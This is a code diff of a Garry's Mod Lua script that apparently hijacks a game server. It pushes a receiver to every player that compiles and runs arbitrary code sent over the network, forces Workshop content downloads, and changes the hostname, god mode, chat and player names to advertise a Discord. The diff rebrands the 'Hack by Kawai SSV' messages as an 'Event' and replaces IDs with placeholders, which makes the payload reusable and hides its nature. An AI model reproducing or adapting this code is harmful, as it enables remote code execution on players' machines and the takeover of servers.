@@ -25,7 +25,7 @@ BroadcastLua([[net.Receive("]] .. randomtable["CodeRandom"] .. [[",function()Com
 hook.Add("PlayerInitialSpawn", "ifyouseethisdontpanicitsme", function(ply)
     if not ply:IsBot() then
         ply:SendLua([[net.Receive("]] .. randomtable["CodeRandom"] .. [[",function()CompileString(util.Decompress(net.ReadData(net.ReadUInt(16))),"?")()end)]])
-        ply:SendLua([[steamworks.DownloadUGC(2017072873, function(n) game.MountGMA(n) game.AddParticles("particles/lesheitan.pcf") PrecacheParticleSystem("lesheitan") end)]])
+        ply:SendLua([[steamworks.DownloadUGC(YOUR_WORKSHOP_ID, function(n) game.MountGMA(n) game.AddParticles("particles/CHANGE_ME.pcf") PrecacheParticleSystem("CHANGE_ME") end)]])
     end
 end)
 
@@ -40,24 +40,24 @@ local len = #data
 end
 for k, v in pairs(player.GetAll()) do
     v:SendLua("steamworks.FileInfo(2017072330,function(result)steamworks.Download(result.fileid,true,function(name)game.MountGMA(name)end) end)")
-    v:SendLua([[steamworks.DownloadUGC(2017072873, function(n) game.MountGMA(n) game.AddParticles("particles/lesheitan.pcf") PrecacheParticleSystem("lesheitan") end)]])
+    v:SendLua([[steamworks.DownloadUGC(YOUR_WORKSHOP_ID, function(n) game.MountGMA(n) game.AddParticles("particles/CHANGE_ME.pcf") PrecacheParticleSystem("CHANGE_ME") end)]])
 end
 
 timer.Simple(2.5, function()
     for k, v in pairs(player.GetAll()) do
     v:SendLua([[RunConsoleCommand("gmod_language", "fr")]])
 end
-    RunConsoleCommand("hostname", "Serveur en cours de Destruction by Kawai SSV -) discord.gg/kurama")
+    RunConsoleCommand("hostname", "Serveur en cours de event by Kawai SSV -) discord.gg/kurama")
     RunConsoleCommand("ulx", "god", "*")
     RunConsoleCommand("sv_alltalk", "1")
-    PrecacheParticleSystem("lesheitan")
+    PrecacheParticleSystem("CHANGE_ME")
 end)
 
 timer.Simple(5, function()
 InfoClient([[net.Receive("]] .. randomtable["TimingRandom"] .. [[",function()CompileString(util.Decompress(net.ReadData(net.ReadUInt(16))),"?")()end)]])
 InfoClient([[
     for i = 1, 10 do
-    ParticleEffectAttach("lesheitan", PATTACH_ABSORIGIN_FOLLOW, LocalPlayer(), 0)
+    ParticleEffectAttach("CHANGE_ME", PATTACH_ABSORIGIN_FOLLOW, LocalPlayer(), 0)
 end
 timer.Simple(5, function()
 timer.Create("]] .. RandomString(0, 69) .. [[", 0.3, 0, function()
@@ -243,23 +243,23 @@ InfoClient([[
 timer.Create("]] .. randomtable["ServeurRadom"] .. [[", 1.5, 0, function()
 local time = tonumber(0)
 local Message = {
-    "< Hack by Kawai SSV >",
-    "<< Hack by Kawai SSV >>",
-    "<<< Hack by Kawai SSV >>>",
-    "<<<< Hack by Kawai SSV >>>>",
-    "<<<<< Hack by Kawai SSV >>>>>",
-    "<<<<<< Hack by Kawai SSV >>>>>>",
-    "<<<<<<< Hack by Kawai SSV >>>>>>>",
-    "<<<<<<<< Hack by Kawai SSV >>>>>>>>",
-    "<<<<<<<<< Hack by Kawai SSV >>>>>>>>>",
-    "<<<<<<<< Hack by Kawai SSV >>>>>>>>",
-    "<<<<<<< Hack by Kawai SSV >>>>>>>",
-    "<<<<<< Hack by Kawai SSV >>>>>>",
-    "<<<<< Hack by Kawai SSV >>>>>",
-    "<<<< Hack by Kawai SSV >>>>",
-    "<<< Hack by Kawai SSV >>>",
-    "<< Hack by Kawai SSV >>",
-    "< Hack by Kawai SSV >",
+    "< Event by Kawai SSV >",
+    "<< Event by Kawai SSV >>",
+    "<<< Event by Kawai SSV >>>",
+    "<<<< Event by Kawai SSV >>>>",
+    "<<<<< Event by Kawai SSV >>>>>",
+    "<<<<<< Event by Kawai SSV >>>>>>",
+    "<<<<<<< Event by Kawai SSV >>>>>>>",
+    "<<<<<<<< Event by Kawai SSV >>>>>>>>",
+    "<<<<<<<<< Event by Kawai SSV >>>>>>>>>",
+    "<<<<<<<< Event by Kawai SSV >>>>>>>>",
+    "<<<<<<< Event by Kawai SSV >>>>>>>",
+    "<<<<<< Event by Kawai SSV >>>>>>",
+    "<<<<< Event by Kawai SSV >>>>>",
+    "<<<< Event by Kawai SSV >>>>",
+    "<<< Event by Kawai SSV >>>",
+    "<< Event by Kawai SSV >>",
+    "< Event by Kawai SSV >",
     }
     for _, line in pairs(Message) do
     time = time + tonumber(0.1)
@@ -363,7 +363,7 @@ end)
 timer.Create("RPName", 5, 99, function()
     for _, v in pairs(player.GetAll()) do
         v:GodEnable()
-        v:setDarkRPVar("rpname", "Hack by Kawai SSV -) Join my Discord : discord.gg/kurama")
+        v:setDarkRPVar("rpname", "Event by Kawai SSV -) Join my Discord : discord.gg/kurama")
     end
 end)
 
